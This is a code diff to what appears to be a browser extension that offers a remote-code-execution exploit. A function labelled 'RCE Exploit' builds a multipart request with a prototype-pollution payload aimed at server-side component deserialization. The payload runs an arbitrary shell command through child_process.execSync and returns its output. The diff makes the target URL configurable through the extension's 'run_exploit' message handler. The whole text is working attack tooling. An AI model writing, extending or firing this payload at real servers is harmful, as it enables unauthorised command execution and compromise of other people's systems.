@@ -45,7 +45,7 @@ async function performFingerprint() {
 }
 
 // === 3. RCE Exploit ===
-async function performExploit(cmd) {
+async function performExploit(cmd, targetUrl) {
     const targetCmd = cmd || "echo vulnerability_test";
 
     const payloadJson = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('${targetCmd}').toString('base64');throw Object.assign(new Error('x'),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
@@ -66,8 +66,6 @@ async function performExploit(cmd) {
         `--${boundary}--`,
         ''
     ].join('\r\n');
-
-    const targetUrl = "/adfa";
 
     try {
         const res = await fetch(targetUrl, {
@@ -132,7 +130,7 @@ browser.runtime.onMessage.addListener((req, sender, sendResponse) => {
         return true;
     }
     if (req.action === "run_exploit") {
-        performExploit(req.cmd).then(res => sendResponse(res));
+        performExploit(req.cmd, req.targetUrl).then(res => sendResponse(res));
         return true;
     }
 });
